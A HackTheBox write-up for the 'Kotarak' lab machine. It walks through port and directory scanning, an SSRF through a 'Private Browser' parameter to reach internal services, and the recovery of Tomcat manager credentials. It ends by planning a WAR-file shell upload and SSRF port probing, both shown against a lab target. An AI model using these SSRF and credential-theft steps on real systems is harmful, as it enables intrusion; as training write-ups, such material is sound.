@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Kotarak | Initial nmap root@Kali:~# nmap -p- -sV 10.10.10.55 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 17:23 GMT Nmap scan report for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Kotarak</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-01-22 17:29:00+00:00">Wed 22 January 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Kotarak.html">Kotarak</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Kotarak.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="mf">10.10.10.55</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.55</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.014</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65531</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mf">7.2</span><span class="n">p2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="n">ubuntu2</span><span class="mf">.2</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span><span class="w"></span>
+<span class="mi">8009</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ajp13</span><span class="w">   </span><span class="n">Apache</span><span class="w"> </span><span class="n">Jserv</span><span class="w"> </span><span class="p">(</span><span class="n">Protocol</span><span class="w"> </span><span class="n">v1</span><span class="mf">.3</span><span class="p">)</span><span class="w"></span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">Tomcat</span><span class="w"> </span><span class="mf">8.5.5</span><span class="w"></span>
+<span class="mi">60000</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.4.18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">66.83</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>Let's try to browse to both tomcat and httpd ports:</p>
+<p><img alt="" src="../images/kotarak-tomcat.png"></p>
+<p><img alt="" src="../images/kotarak-private-browser.png"></p>
+<p>I also run a directories scan with gobuster on port 8080:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir -u http://kotarak.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5</span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1</span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            http://kotarak.htb:8080</span>
+<span class="err">[+] Threads:        5</span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="err">[+] User Agent:     gobuster/3.0.1</span>
+<span class="err">[+] Timeout:        10s</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/23 05:22:32 Starting gobuster</span>
+<span class="err">===============================================================</span>
+<span class="err">/docs (Status: 302)</span>
+<span class="err">/examples (Status: 302)</span>
+<span class="err">/manager (Status: 302)</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/23 05:32:47 Finished</span>
+<span class="err">===============================================================</span>
+</pre></div>
+
+
+<p>and I do the same on port 60000:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir -u http://kotarak.htb:60000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5</span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1                                                                                </span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            http://kotarak.htb:60000                                                   </span>
+<span class="err">[+] Threads:        5                                                                          </span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403                   </span>
+<span class="err">[+] User Agent:     gobuster/3.0.1                                                             </span>
+<span class="err">[+] Timeout:        10s                                                                        </span>
+<span class="err">===============================================================          </span>
+<span class="err">2020/01/23 05:34:51 Starting gobuster                                                          </span>
+<span class="err">===============================================================</span>
+<span class="err">/server-status (Status: 403)                                                                   </span>
+<span class="err">===============================================================</span>
+<span class="err">2020/01/23 05:45:17 Finished                                                                   </span>
+<span class="err">===============================================================</span>
+</pre></div>
+
+
+<p>I explored the directories gobuster and found the following admin panel login page:</p>
+<p><img alt="" src="../images/kotarak-tomcat-manager.png"></p>
+<p>Having access to that portal would be giving us access to tomcat management interface which in turn can lead to other potential accesses.</p>
+<p><img alt="" src="../images/kotarak-server-status.png"></p>
+<p>As shown above navigating to the box on port 60000 in the directory <strong>server-status</strong> found by gobuster shows a permission error. This page usually provide very useful information that we could use for our attack.</p>
+<p>For the Private Browser to do its job there must be some kind of mechanisms in the back-end, potentially another server or application that "makes things private". In fact, I suspect that when we enter the URL in the Private Browser this is then passed to the relevant back-end API endpoint to be processed and in turn the endpoint will respond with the private data.</p>
+<p>The mechanism I explained above is ideal for an SSRF (Server Side Request Forgery) which is very well explained <a href="https://portswigger.net/web-security/ssrf">here</a>. </p>
+<p>With this nice explanation in mind I will try to add the Browser and see what happens.</p>
+<p><img alt="" src="../images/kotarak-ssrf.png"></p>
+<p>As we can see we now get access to the <strong>server-status</strong> page we previosly got permissions issues for. This is because now apache which is running on port 60000 receives the request as if it comes from the same host (in fact, we used localhost)</p>
+<p>The <strong>server-status</strong> page shows a list of running processes with listening ports. We can see port 888 is recurring. Browising to localhost on port 888 from the Private Browser we have this:</p>
+<p><img alt="" src="../images/kotarak-888.png"></p>
+<p>I checked inside all the directories and they are all empty. </p>
+<p><img alt="" src="../images/kotarak-backup.png"></p>
+<p>I decide to have a look at this with curl which reveals the follwing output:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">kotarak</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">60000</span><span class="o">/</span><span class="n">url</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="k">path</span><span class="o">=</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">888</span><span class="o">/</span><span class="vm">?</span><span class="n">doc</span><span class="o">=</span><span class="k">backup</span><span class="w"></span>
+<span class="o">&lt;</span><span class="vm">?</span><span class="nc">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="ss">&quot;1.0&quot;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="ss">&quot;UTF-8&quot;</span><span class="vm">?</span><span class="o">&gt;</span><span class="w"></span>
+<span class="o">&lt;</span><span class="err">!</span><span class="c1">--</span>
+<span class="w">  </span><span class="n">Licensed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="n">Software</span><span class="w"> </span><span class="n">Foundation</span><span class="w"> </span><span class="p">(</span><span class="n">ASF</span><span class="p">)</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">more</span><span class="w"></span>
+<span class="w">  </span><span class="n">contributor</span><span class="w"> </span><span class="n">license</span><span class="w"> </span><span class="n">agreements</span><span class="p">.</span><span class="w">  </span><span class="n">See</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">NOTICE</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">distributed</span><span class="w"> </span><span class="k">with</span><span class="w"></span>
+<span class="w">  </span><span class="n">this</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">regarding</span><span class="w"> </span><span class="n">copyright</span><span class="w"> </span><span class="n">ownership</span><span class="p">.</span><span class="w"></span>
+<span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">ASF</span><span class="w"> </span><span class="n">licenses</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="n">License</span><span class="p">,</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">2.0</span><span class="w"></span>
+<span class="w">  </span><span class="p">(</span><span class="n">the</span><span class="w"> </span><span class="ss">&quot;License&quot;</span><span class="p">);</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="ow">except</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">compliance</span><span class="w"> </span><span class="k">with</span><span class="w"></span>
+<span class="w">  </span><span class="n">the</span><span class="w"> </span><span class="n">License</span><span class="p">.</span><span class="w">  </span><span class="n">You</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">obtain</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">License</span><span class="w"> </span><span class="k">at</span><span class="w"></span>
+
+<span class="w">      </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">apache</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">LICENSE</span><span class="o">-</span><span class="mf">2.0</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">Unless</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">applicable</span><span class="w"> </span><span class="n">law</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">agreed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">writing</span><span class="p">,</span><span class="w"> </span><span class="n">software</span><span class="w"></span>
+<span class="w">  </span><span class="k">distributed</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">License</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">distributed</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="ss">&quot;AS IS&quot;</span><span class="w"> </span><span class="n">BASIS</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="k">WITHOUT</span><span class="w"> </span><span class="n">WARRANTIES</span><span class="w"> </span><span class="ow">OR</span><span class="w"> </span><span class="n">CONDITIONS</span><span class="w"> </span><span class="k">OF</span><span class="w"> </span><span class="ow">ANY</span><span class="w"> </span><span class="n">KIND</span><span class="p">,</span><span class="w"> </span><span class="n">either</span><span class="w"> </span><span class="n">express</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">implied</span><span class="p">.</span><span class="w"></span>
+<span class="w">  </span><span class="n">See</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">License</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">specific</span><span class="w"> </span><span class="k">language</span><span class="w"> </span><span class="n">governing</span><span class="w"> </span><span class="nf">permissions</span><span class="w"> </span><span class="ow">and</span><span class="w"></span>
+<span class="w">  </span><span class="n">limitations</span><span class="w"> </span><span class="k">under</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">License</span><span class="p">.</span><span class="w"></span>
+<span class="c1">--&gt;</span>
+<span class="o">&lt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">users</span><span class="w"> </span><span class="n">xmlns</span><span class="o">=</span><span class="ss">&quot;http://tomcat.apache.org/xml&quot;</span><span class="w"></span>
+<span class="w">              </span><span class="nl">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="ss">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="w"></span>
+<span class="w">              </span><span class="nl">xsi</span><span class="p">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="ss">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><span class="w"></span>
+<span class="w">              </span><span class="n">version</span><span class="o">=</span><span class="ss">&quot;1.0&quot;</span><span class="o">&gt;</span><span class="w"></span>
+<span class="o">&lt;</span><span class="err">!</span><span class="c1">--</span>
+<span class="w">  </span><span class="nl">NOTE</span><span class="p">:</span><span class="w">  </span><span class="k">By</span><span class="w"> </span><span class="k">default</span><span class="p">,</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="ss">&quot;manager-gui&quot;</span><span class="w"> </span><span class="k">role</span><span class="w"> </span><span class="n">required</span><span class="w"></span>
+<span class="w">  </span><span class="k">to</span><span class="w"> </span><span class="n">operate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="ss">&quot;/manager/html&quot;</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="p">.</span><span class="w">  </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">wish</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">app</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="n">you</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">define</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">arbitrary</span><span class="p">.</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="k">is</span><span class="w"></span>
+<span class="w">  </span><span class="n">strongly</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">NOT</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">commented</span><span class="w"> </span><span class="k">out</span><span class="w"></span>
+<span class="w">  </span><span class="k">section</span><span class="w"> </span><span class="n">below</span><span class="w"> </span><span class="n">since</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">intended</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">examples</span><span class="w"> </span><span class="n">web</span><span class="w"></span>
+<span class="w">  </span><span class="n">application</span><span class="p">.</span><span class="w"></span>
+<span class="c1">--&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="c1">--</span>
+<span class="w">  </span><span class="nl">NOTE</span><span class="p">:</span><span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">sample</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">role</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="n">below</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">intended</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"></span>
+<span class="w">  </span><span class="n">examples</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="p">.</span><span class="w"> </span><span class="n">They</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">wrapped</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">comment</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">thus</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">ignored</span><span class="w"></span>
+<span class="w">  </span><span class="k">when</span><span class="w"> </span><span class="n">reading</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">file</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">wish</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">configure</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"></span>
+<span class="w">  </span><span class="n">examples</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="p">,</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">forget</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">remove</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">&lt;</span><span class="err">!</span><span class="p">..</span><span class="w"> </span><span class="p">..</span><span class="o">&gt;</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">surrounds</span><span class="w"></span>
+<span class="w">  </span><span class="n">them</span><span class="p">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">something</span><span class="w"> </span><span class="n">appropriate</span><span class="p">.</span><span class="w"></span>
+<span class="c1">--&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="c1">--</span>
+<span class="w">  </span><span class="o">&lt;</span><span class="k">role</span><span class="w"> </span><span class="n">rolename</span><span class="o">=</span><span class="ss">&quot;tomcat&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="o">&lt;</span><span class="k">role</span><span class="w"> </span><span class="n">rolename</span><span class="o">=</span><span class="ss">&quot;role1&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="ss">&quot;tomcat&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="ss">&quot;&lt;must-be-changed&gt;&quot;</span><span class="w"> </span><span class="n">roles</span><span class="o">=</span><span class="ss">&quot;tomcat&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="ss">&quot;both&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="ss">&quot;&lt;must-be-changed&gt;&quot;</span><span class="w"> </span><span class="n">roles</span><span class="o">=</span><span class="ss">&quot;tomcat,role1&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="ss">&quot;role1&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="ss">&quot;&lt;must-be-changed&gt;&quot;</span><span class="w"> </span><span class="n">roles</span><span class="o">=</span><span class="ss">&quot;role1&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+<span class="c1">--&gt;</span>
+<span class="w">    </span><span class="o">&lt;</span><span class="k">user</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="ss">&quot;admin&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="ss">&quot;3@g01PdhB!&quot;</span><span class="w"> </span><span class="n">roles</span><span class="o">=</span><span class="ss">&quot;manager,manager-gui,admin-gui,manager-script&quot;</span><span class="o">/&gt;</span><span class="w"></span>
+
+<span class="o">&lt;/</span><span class="n">tomcat</span><span class="o">-</span><span class="n">users</span><span class="o">&gt;</span><span class="w"></span>
+</pre></div>
+
+
+<p>In the last line we can see a username and password. Let's see if we can use these credentials to login in the tomcat management panel.</p>
+<p>And we are in!</p>
+<p><img alt="" src="../images/kotarak-login-ok.png">
+<img alt="" src="../images/kotarak-war.png"></p>
+<p>The bottom part of the page shows a section we can use to upload a <a href="https://en.wikipedia.org/wiki/WAR_(file_format)">war</a> file to the server. We can leverage this and upload some code in a war file which can give us a shell back.</p>
+<p>Before to do that I wanted to point out that this time we were lucky because we were able to see the <strong>server-status</strong> page which reveaed port 888 and by digging we also find the credentials. What if the page wasn't accessible? In this case there is another thing we could do. The same way we tested port 888 by inserting the string "localhost:888" in the Private Browser search field (or using curl), we can test the other ports:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# curl http://kotarak.htb:60000/url.php?path=localhost:22</span>
+<span class="err">SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</span>
+<span class="err">Protocol mismatch.</span>
+</pre></div>
+
+
+<p>The above is a test on port 22 which reveales the port is open. Technically we can write a little script that tries all the ports automatically. However there is already a tool in kali that can do these kind of things, <strong>wfuzz</strong>.</p>
